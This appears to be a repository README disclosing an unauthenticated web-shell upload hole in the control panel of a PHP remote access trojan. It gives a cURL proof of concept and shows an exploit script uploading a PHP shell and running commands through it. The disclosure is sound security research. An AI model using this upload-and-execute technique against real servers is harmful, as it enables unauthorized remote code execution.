# TorCTPwn

I was having a look at the C&C panel of the [TorCT RAT](https://github.com/alienwithin/torCT-PHP-RAT) for a bit of amusement, and noticed that it suffers an absurdly trivial shell upload vulnerability, outlined below.

See: [upload.php](https://github.com/alienwithin/torCT-PHP-RAT/blob/master/server/upload.php) and note we can upload whatever the hell we want to a place with whatever name we want. Trivial shell upload with no auth or anything.

PoC using cURL:
```
$ curl -F name=lol.php -F file=@/tmp/lol.php -i http://localhost/upload.php
File lol.php is successfully uploaded!
File is successfully stored!
$ curl http://localhost/Upload/lol.php?1=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ curl http://localhost/Upload/lol.php?1=uname
Linux
$ 
```

For shits and giggles, there is also an automated exploit for this in this repo.
```
$ python torct-pwn.py 
use: torct-pwn.py http://torct.whatever/upload.php /your/shell.php
$ python torct-pwn.py http://localhost/upload.php /tmp/lol.php 
[+] Shell Uploaded! It should be in: http://localhost/Upload/lol.php
$ curl http://localhost/Upload/lol.php?1=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```
